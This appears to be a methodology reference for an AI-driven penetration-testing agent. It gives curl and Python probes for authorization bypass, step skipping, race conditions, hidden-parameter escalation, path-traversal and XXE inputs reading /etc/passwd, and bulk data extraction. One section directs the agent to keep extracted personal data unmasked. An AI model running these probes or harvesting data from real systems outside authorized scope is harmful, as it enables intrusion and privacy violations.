# Vuln Hunting Reference

The expanded version of SKILL.md. Each section gives: checklist → specific techniques → evidence forms.

---

## General Prep: Draw the "State and Role Diagram"

Before hunting any feature, draw this diagram first (write it in script comments or in the fact's detail). **Skipping this step is shooting in the dark**.

```
Feature: <feature name, e.g. "Edit Profile">
├─ Roles
│   ├─ Anonymous (no auth)
│   ├─ Normal user (own account A)
│   └─ Admin (own account B)
├─ States
│   ├─ Initial / Pending review / Published / Taken down
│   └─ …
├─ Steps
│   ├─ S1 Upload
│   ├─ S2 Submit
│   ├─ S3 Review
│   └─ S4 Publish
└─ Parameters (mark each: frontend-visible? / frontend-controllable? / backend-validated?)
   ├─ userId   ← appears in URL/Body, frontend-visible, controllable
   ├─ role     ← **only in the request body, not in the UI** ← key
   └─ price    ← computed by the frontend ← key
```

**Three questions to ask after drawing**:
1. Which parameters are **invisible in the UI** but present in the request? (→ Dimension 4)
2. Which steps **can be skipped**? (→ Dimension 2)
3. Which states **should not allow operations**? (→ Dimension 3)

---

## Dimension 1: Object Swapping (Authorization Bypass)

### Checklist
- [ ] Every parameter carrying an ID (path/body/query)
- [ ] Every field identifying identity/role (`uid` `user_id` `role` `is_admin` `dept_id` `tenant_id`)
- [ ] Every "object type" marker (`type` `kind` `object`)

### Techniques

**Horizontal privilege escalation (two of your own objects)**
```bash
# First use account A to get your own object id
curl -s -H "Authorization: Bearer $TOKEN_A" "https://t/api/orders" | python3 -m json.tool | head -40
# Then swap the id for another of account A's objects
curl -s -H "Authorization: Bearer $TOKEN_A" "https://t/api/orders/OTHER_ID" | head -c 500
```
Success criteria: **data not belonging to that token was returned** (not a 403/404 empty).

**Vertical privilege escalation (modify role field)**
```bash
# Normal request body has a role field → change to admin
curl -s -X PUT "https://t/api/user/profile" -H "Authorization: Bearer $TOKEN_LOW" \
  -H 'Content-Type: application/json' \
  -d '{"nickname":"x","role":"admin","is_admin":true,"is_vip":1}' | head -c 500
```
**Key**: you need the **normal request body** to know which fields exist → first capture baseline traffic (`traffic_search`).

**Missing authentication**
```bash
# Remove the auth header entirely
curl -s "https://t/api/user/info" | head -c 300
# Use an invalid token
curl -s -H "Authorization: Bearer invalid" "https://t/api/user/info" | head -c 300
```

**Type confusion**
```bash
for v in 0 -1 999999999 abc null [] ""; do
  echo "--- $v ---"
  curl -s "https://t/api/order/$v" | head -c 200; echo
done
```

### Evidence Forms
```
Account A (uid=1001, normal user) carrying its own token,
GET /api/orders/2002 (2002 belongs to another of account A's objects) returned full order data,
while requesting account B's object 3003 on the same endpoint returned 403.
→ Horizontal privilege escalation; boundary validated only by object ownership, not by binding to the token
```
Record: the two uids A/B, the two object ids, and the response difference between the two requests.

---

## Dimension 2: Flow Decomposition (Skip Steps / Call Later Endpoints Directly)

### Checklist
- [ ] Pick out **multiple endpoints of the same feature** from baseline traffic
- [ ] Order the steps by request sequence S1→S2→S3
- [ ] Find which S steps are "done automatically by the server after submission"

### Techniques

**Call the final step directly**
```bash
# Seen in traffic: S1 POST /upload → S2 POST /order → S3 POST /order/confirm
# Call only S3:
curl -s -X POST "https://t/api/order/confirm" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"orderId":1001}' | head -c 400
```

**Skip validation** (registration/verification/payment/review/risk control)
```bash
# Registration flow requires email verification code → call the "set password" step directly
curl -s -X POST "https://t/api/user/set-password" -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' | head -c 400
```

**Replay (idempotency)**
```bash
# Send the same request twice, see if it double-charges/double-ships/double-issues coupons
# Save responses to this intent's working directory (platform rule: intermediate artifacts don't go in /tmp)
curl -s -i -X POST "https://t/api/coupon/redeem" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"couponId":9}' > redeem1.txt
sleep 1
curl -s -i -X POST "https://t/api/coupon/redeem" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"couponId":9}' > redeem2.txt
```
Then call `diff_responses` (`file_a=redeem1.txt`, `file_b=redeem2.txt`):
**No structural difference = idempotent**; value differences (especially quantity/balance/status fields) = **applied repeatedly**.
Don't use `diff` for byte-by-byte comparison—timestamps/requestIds in responses differ every time, causing a false "two are different" judgment.

### Evidence Forms
```
Normal flow: POST /api/order (returns orderId=1001, status=pending)
→ POST /api/order/confirm (returns success)
Bypass: no order created, directly POST /api/order/confirm {"orderId":1001} → returns success
→ Backend did not validate order existence and ownership, prerequisite state check missing
```

---

## Dimension 3: State Machine (Illegal Transitions / Race Conditions)

### Checklist
- [ ] Does the target object have a lifecycle (state field)
- [ ] Which operations each state allows
- [ ] Whether there is a "prerequisite state" check between operations

### Techniques

**Illegal state transition**
```bash
# State machine: pending → paid → shipped → done
# Confirm receipt without paying
curl -s -X POST "https://t/api/order/1001/confirm-receipt" -H "Authorization: Bearer $TOKEN" | head -c 400
# Cancel an already-completed order
curl -s -X POST "https://t/api/order/1001/cancel" -H "Authorization: Bearer $TOKEN" | head -c 400
```

**Race conditions (2–5 concurrent, small scale)**
```python
# Race condition verification script (write to this intent's working directory)
import concurrent.futures, requests, json, sys
URL = "https://t/api/coupon/redeem"
TOK = sys.argv[1] if len(sys.argv) > 1 else ""
H = {"Authorization": f"Bearer {TOK}", "Content-Type": "application/json"}
def hit(i):
    r = requests.post(URL, headers=H, json={"couponId": 9}, timeout=10)
    return i, r.status_code, r.text[:200]
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
    for i, code, body in ex.map(hit, range(5)):
        print(i, code, body)
```
**What to look for**: whether **all multiple requests return success** (= no uniqueness constraint/no lock).
**Rule out first**: the target has a unique index (check in DB) or an idempotency key → such races are usually not exploitable, change direction.

**TOCTOU** (time-of-check to time-of-use): check balance/permission first, then execute, with the intermediate state being changed.

### Evidence Forms
```
5 simultaneous requests to POST /api/coupon/redeem {"couponId":9},
all 5 response bodies are {"success":true}, while the coupon's face value is 100 yuan.
When sent once, the backend checks whether the coupon was redeemed → showing no atomicity between check and write (no unique constraint, no lock),
all 5 requests redeemed successfully → over-redemption.
```

---

## Dimension 4: Data Boundaries (Trust Boundary / Injection / Second-Order Injection)

### Checklist
- [ ] The **source** of each request parameter: URL? Body? Header? Cookie?
- [ ] Which parameters are **assigned in frontend JS** (indicating the backend may trust the frontend)
- [ ] Which parameters are **invisible in the UI** (hidden parameters)
- [ ] Which data gets **stored** (comments/nicknames/files/notes) → second-order injection candidates

### Techniques

**Hidden parameter probing**
```bash
# Get the normal body from baseline traffic, then add fields one at a time
for f in role is_admin is_vip level price status user_id uid group_id; do
  printf "%-10s " "$f"
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://t/api/user/update" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"nickname\":\"t\",\"$f\":1}"
  echo
done
```
**Interpretation**: a field only counts if it returns 200 AND the **subsequent state actually changed** (confirm with another account/endpoint).

**Locating injection points**
- Priority for finding points: error messages → parameter reflection → boolean differences (`and 1=1` vs `and 1=2` response differences) → timing differences
- **Do not use** destructive payloads like `; DROP TABLE` for verification (violates platform interception rules and is irreversible)
- Use **harmless** difference-type payloads to prove controllability

**Second-order injection**
```bash
# 1) Store: submit the payload as a nickname/comment
curl -s -X POST "https://t/api/comment" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"content":"MARKER_TEST"}' | head -c 200
# 2) Trigger: find a place that renders/parses this data (admin panel lists, exports, notifications)
#    → Observe whether MARKER_TEST is parsed as syntax
```

### Evidence Forms
```
POST /api/user/update request body contains {"role":"user"} (no such field in the UI),
submitting {"role":"admin"} returns 200, and after re-logging in with account A,
GET /api/user/info returns {"role":"admin"} — the backend directly trusts the role field passed by the frontend.
```

---

## Dimension 5: Resource Assumptions

### Checklist
- [ ] Are there resources that "can only have one" (username, order number, coupon code, invite code)
- [ ] Are there "limits" (daily count, quota, concurrency, length)
- [ ] Is there "ordering" (approval, publishing, listing)
- [ ] Are there prerequisite objects that "must exist"

### Techniques

**Uniqueness assumption**
```python
# Concurrently register the same username / redeem the same coupon code / claim the same invite code
# See the concurrency script template in Dimension 3
```

**Limit bypass**
```bash
# 1 per request → try batch
curl -s -X POST "https://t/api/claim" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"count":100}' | head -c 300
# Counter is in the frontend → try calling the claim endpoint directly (bypass frontend counting)
```

**Length/size assumption**
```bash
# Overlong input (1024/4096/65536) to see if validation fails after truncation
python3 -c "print('A'*70000)" > payload.txt
# Pass via file:
curl -s -X POST "https://t/api/profile" -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "name@payload.txt" | head -c 300
```

### Evidence Forms
```
POST /api/claim {"count":1} claims 1 coupon per request;
POST /api/claim {"count":100} returns 200 and the coupon bundle increases by 100 —
the backend does not enforce an upper limit on the per-request claim quantity (limit assumption does not hold).
```

---

## Dimension 6: Error Paths

### Checklist
- [ ] Each endpoint's **illegal input** response
- [ ] Response difference between "does not exist" and "no permission"
- [ ] Whether error response bodies contain sensitive information

### Techniques

**Error leakage**
```bash
# Illegal type / illegal format / overlong / special characters
for v in "1" "'" "\"" "<script>" "../../etc/passwd" "-1" "1e999" "null"; do
  echo "--- $v ---"
  curl -s "https://t/api/item/$v" | head -c 200; echo
done
```
**What to look for**: stack traces, SQL fragments, file paths, internal addresses, key fragments, framework version numbers.

**Existence enumeration**
```bash
# Compare the two responses "does not exist" and "exists but no permission"
# Save both responses to this intent's working directory (platform rule: intermediate artifacts don't go in /tmp)
curl -s -i "https://t/api/user/999999" > user_999999.txt   # does not exist
curl -s -i "https://t/api/user/1001"  > user_1001.txt     # someone else's
```
Then call `diff_responses` (with `file_a=user_999999.txt`, `file_b=user_1001.txt`):
**Different status codes or different JSON key sets → enumerable**. The tool filters out noise like timestamps/trace ids,
leaving only real structural differences.
(The tool's `enumerable` field gives this judgment directly, but **the difference itself is not a vulnerability**—you must also confirm
that the "exists but no permission" response doesn't leak others' data; that would be an authorization bypass.)

**Fail-open**
```python
# Make the prerequisite check fail (e.g. missing field/wrong format), see if subsequent steps still execute
# Typical: upload endpoint's file type check fails, but the file was already written to disk
```

### Evidence Forms
```
GET /api/item/abc (non-numeric id) returns 500, response body contains
"SQLSTATE[42S02]: Base table or view not found: 1146 Table 'app.users' doesn't exist"
— errors are not handled uniformly, leaking table names and database type to the outside.
```

---

## Dimension 7: Chaining

### Checklist
- [ ] Does "modifiable data" contain "fields that determine permission/price/state"
- [ ] Will "written" content be parsed "elsewhere"
- [ ] Will "uploaded" files be "parsed by the backend"
- [ ] Can "obtained things" (token/ticket/temporary credentials) be used elsewhere

### Techniques

**Privilege escalation chain**
```bash
# 1) Among the fields a low-privilege account can modify, are there any that affect permissions
curl -s -X PUT "https://t/api/user/profile" -H "Authorization: Bearer $TOKEN_LOW" \
  -H 'Content-Type: application/json' -d '{"dept_id":1,"is_manager":true}' | head -c 300
# 2) Re-login to get new permissions, then see if you can access admin endpoints
curl -s -H "Authorization: Bearer $TOKEN_NEW" "https://t/api/admin/users" | head -c 300
```

**Upload + parsing**
```bash
# Will the backend parse after upload? Try SVG (with XXE)/ archive (Zip Slip)/ image (ImageTragick)
# Name with ../ to see if it lands in an unexpected path
curl -s -F "file=@payload.svg" "https://t/api/upload" -H "Authorization: Bearer $TOKEN" | head -c 300
```

**Cache poisoning**
```bash
# After changing content, does another identity/incognito window still see the old content?
# Observe cache directives in response headers: X-Cache / Cache-Control / Age
curl -s -D - -o /dev/null "https://t/api/news/1" | grep -iE "cache|age|etag"
```

### Evidence Forms
```
Upload endpoint accepts SVG and stores it as-is (response body returns an accessible URL /uploads/xxx.svg);
this SVG contains <!ENTITY xxe SYSTEM "file:///etc/passwd">,
entity resolution is triggered when an admin renders the file on the backend "View Uploads" page.
(Verification uses only harmless entities, does not read real key files.)
```

---

## Evidence Recording Template (Organize Like This When Writing Back)

**finding (confirmed)**:
```
[Behavior] The specific difference between normal vs abnormal requests
[Prerequisites] Account A (uid=?, role=?) / object id=? / concurrency=?
[Reproduction] Complete reproducible steps (commands + key parameters)
[Impact] What happened after success (whose data was read / how many extra coupons / whose config was overwritten)
[Counter-evidence] Still holds after changing identity/parameter order/client
[Harmlessness] The verification process caused no damage
```

**fact (unconfirmed)**:
```
[Suspicion] Which endpoint's which behavior is suspicious
[Observation] What was observed (error difference/status code difference/response length difference)
[Why unconfirmed] What condition is missing (need an X account / a parameter not found / race not reproduced)
[Next step] What intent the planner can dispatch to confirm
```

---

## Dimension 8: Data-Surface Maximization (Non-Destructive Data Extraction, v0.4.34)

Applies to endpoints **confirmed to allow unauthorized/over-privileged data reading** (typical: test controllers, gateway whitelist misconfigurations, unauthenticated
list/export endpoints). The goal is not "able to read one record", but **proving the impact to the
maximum without disrupting the business**—official verification looks at record scale, field sensitivity, and cross-subsystem coverage.

### Checklist

1. **Sibling endpoints with the same prefix**: probe read-only endpoints under the same controller/prefix one by one (list list/page, query
   query/find/get, export export/download/excel/pdf, statistics stat/count, dictionary dict/type).
   Separate probing from extraction: first use empty body/minimal parameters to see status code and response shape, then fill in parameters for the full set.
2. **Parameter surface**: pagination (page/pageNo/pageSize/size/limit/offset), time window (startDate/
   endDate/beginTime/endTime), status and filters (status/type/orgId/deptId/keyword).
   Compare record-count changes across parameters to find the true full-set criterion (many endpoints return only the first page/last day by default).
3. **Data boundaries**: per-request record cap, max pagination depth, whether full export is supported; cross-subsystem (same gateway
   other service prefixes behind it) whether the same misconfiguration exists.
4. **Side-effect endpoints**: sendMsg/notify/push, clear-cache/refresh, delete/remove/cancel,
   pay/refund/confirm, update/edit/save, export-async etc. **verify existence only, do not execute**;
   write in the report "has X capability surface, not executed to keep the business undisrupted".
5. **Extraction discipline**: read-only (GET/POST query semantics); sleep 0.3–1s between pagination/batches; if a single response is too large
   save to disk, don't repeatedly re-download; store full data in this intent's working directory, register key samples with `save_evidence`
   (**plaintext preserved, no masking, no desensitization**—first-party submission for official verification).
6. **Proof structure**: record count + field list (which PII/financial/credential fields) + time coverage range +
   cross-system/cross-endpoint coverage + baseline comparison (real business endpoint on same service returns 401 while this endpoint returns 200).

### Anti-patterns

- Report "unauthorized access" after extracting only 1 record (weak impact proof, rating can't go up).
- Treat one page with default parameters as "full set" (first confirm default page size and total-count field).
- "Test" export/query endpoints with write operations (disrupts business, red line).
- After getting data, don't save to disk, only paste the first few records into evidence (can't prove scale).

## Dimension 9: Same-Family Migration (variant hunting, v0.4.35)

After confirming a vulnerability, the most efficient next step is not to switch targets, but to **replicate the same mechanism to same-family assets**—
this is the "break one, break all" leverage most used by human researchers. sapper-v2's evidence is: same-family intelligence broadcast can turn one
breakthrough into multiple parallel verification lines within 30 seconds.

### Checklist

1. **Same product/same version/same framework**: confirm the fingerprint (footer/JS/header/error page/version number), across the **task
   scope** search exhaustively for the same components—other sites on the same CMS, sibling microservices behind the same gateway (mib-*),
   same test controller prefix, same middleware (Nacos/Druid/Actuator/MinIO/Redis).
2. **Same asset family**: sites on the same root domain/ICP/subdomain batch; services with the same port and same banner in the same IP range;
   different business systems under the same SSO/gateway.
3. **Same-mechanism variants**: unauthorized read → sibling read-only endpoints/export endpoints; IDOR → adjacent object ids/batch endpoints;
   login bypass → other login entries of the same product; upload → other upload points of the same framework.
4. **Reuse clues**: write confirmed PoC, paths, parameters, credentials into the variant intent's summary,
   so the worker can directly use them for verification without re-exploring.
5. **Boundary**: variants must be anchored to assets within task_scope; never touch cross-domain/cross-customer assets (authorization red line).

### Anti-patterns

- Switch targets after confirming one vulnerability (wasting established fingerprint and path knowledge).
- Search only the same domain, not the same product (other customer sites on the same CMS are often equally vulnerable, but **must be within this task's authorization
  scope**).
- Variant intent doesn't clearly state "what same mechanism to verify", so the worker can only blindly search again.

## Platform Tool Quick Reference

| Scenario | Usage |
|---|---|
| Get baseline traffic | `traffic_search` (must specify host) → `traffic_get(id)` to see raw |
| Large response | `traffic_blob(hash)` fetch in segments |
| Concurrency script | Write to **this intent's working directory**, run with `python3`, 2–5 concurrent |
| Parameter difference comparison | Save two responses to files then use the `diff_responses` tool (structured diff, auto-filters noise; don't use `diff` byte-by-byte—different timestamps will report "different") |
| Directory/parameter enumeration | `ffuf` / `feroxbuster` / `gobuster` |
| Endpoint enumeration | `katana` (crawl paths) |
| Middleware protocols | Host environment page "Middleware Protocols" group (gmqtt/pika/pymongo/zeep/netmiko…) |
